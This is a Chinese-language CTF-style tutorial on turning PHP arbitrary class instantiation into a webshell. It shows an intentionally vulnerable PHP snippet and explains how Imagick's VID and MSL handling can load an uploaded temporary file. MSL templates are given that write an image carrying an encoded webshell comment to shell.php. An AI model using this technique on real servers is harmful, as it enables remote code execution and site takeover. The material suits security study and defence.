利用imagick写马

如下题目：

class App {
    function __construct ($cmd) {
        system($cmd);
    }
}

class App2 {
    function App2 ($cmd) {
        system($cmd);
    }
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);

在这段代码中，我们可以将a设置为App1或者2，将b设置为要执行的命令，便可以进行命令执行，但假设在其中没有像App1和2那样的可利用类的化，那就需要考虑其他的类，这个时候可以看自动加载函数，在 PHP 中，自动加载函数是一种特殊的函数，它可以在使用未定义的类时动态加载类文件。当你在 PHP 代码中使用一个尚未被定义的类时，PHP 会自动触发自动加载函数来查找并加载相应的类文件，以便能够使用这个类。

imagick简介

Imagick 是一个用于在 PHP 中操作图像的扩展库。它基于 ImageMagick 库，提供了丰富的图像处理功能，包括图像格式转换、大小调整、滤镜应用、图像合并等等。

使用 Imagick，你可以通过简单的 PHP 代码实现复杂的图像操作。它支持常见的图像格式，如 JPEG、PNG、GIF、TIFF，还支持一些额外的格式，如 PDF、SVG。

Imagick 库提供了一系列的类和方法，使你可以轻松地加载、保存和处理图像。你可以利用这些方法执行图像的基本操作，如旋转、裁剪、缩放、模糊和锐化等。此外，你还可以应用滤镜和效果，如灰度、反转、色彩调整和边缘检测。

VID协议

VID 实际上是 ImageMagick 中包裹一个文件或协议的一种方法。例如，如果您想在单个文件中访问一个目录中的所有图片，则可以使用 VID 协议来表示该操作，并使用通配符指示 ImageMagick 在目录中查找所有文件。

需要注意的是 VID 协议仅适用于指示 ImageMagick 如何处理文件和协议。它并不是一个独立的协议，它不能单独使用而必须与另一个协议或文件名一起使用。

使用 VID 协议的常见目的是为了筛选一批文件，以便选择一个或多个文件进行处理。在 PHP 中，上传的文件由临时文件名表示，通常是以 “php” 开头，后跟随机字符串的形式生成。使用 VID 协议可以通过通配符选择符合条件的文件，例如 vid:msl:/tmp/php* 表示选择 /tmp 目录下以 “php” 开头的文件。

除了通配符之外，VID 协议还支持其他参数。下面是一个使用 VID 协议和其他参数的示例：

<?php
// 使用 Vid 协议来获取 /tmp 目录下的所有 GIF 图片的第一帧
$firstFrame = new Imagick('vid:gif:/tmp/*.gif[0]');
?>

在上面的示例中，我们使用 VID 协议表示获取 /tmp 目录下所有 GIF 图像的第一帧。[0] 表示选取序列中的第一个图像帧，并使用 GIF 协议指示 ImageMagick 选择 GIF 图像。

利用方法

通过前面对vid的利用，我们可以让Imagick加载PHP上传的临时文件，而文件内容是完全可控的，那么我们就可以在其中构造恶意msl脚本，执行我们需要的逻辑。 前面我也说了，其实恶意msl脚本的核心就是和这两个标签。通过可以读取一个图片，图片可以来自于远程http，也可以来自于本地；通过可以将前面获取的图片写入到另一个位置，而且文件名可控。 那么，我们就可以通过如下一个msl文件来从Web服务器下载图片并写入到shell.php这个文件中： 

<?xml version="1.0" encoding="UTF-8"?> 
<image>   
<read filename="hxxps://placehold.co/100.png"/>   	 
<write filename="shell.php" /> 
</image>

但是ImageMagick在处理图片后，会导致丢失原始图片中的信息，所以使用图片马是无法成功写入Webshell的。 要解决这个问题也很简单，既然MSL是一门图片处理语言，我们就可以找找是否有方法在图片中增加一些“注释”。msl有一个标签可以给生成的图片加注释，所以我们将Webshell编码后放在这个标签里即可：

<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="hxxps://placehold.co/100.png"/>
  <comment>HTML实体编码后的Webshell</comment>
  <write filename="shell.php" />
</image>

发送数据包如图1，成功写入shell.php文件在当前目录，访问可见phpinfo()已解析，

如果服务器不能联网，我们可以找一些本地图片文件做处理，比如安装ImageMagick后自带的图片“/usr/share/doc/ImageMagick-7/www/wand.png”： 

<?xml version="1.0" encoding="UTF-8"?> 
<image> 
<read filename="/usr/share/doc/ImageMagick-7/www/wand.png"/>
<comment>

HTML实体编码后的Webshell:

</comment> 
<write filename="shell.php" /> 
</image>
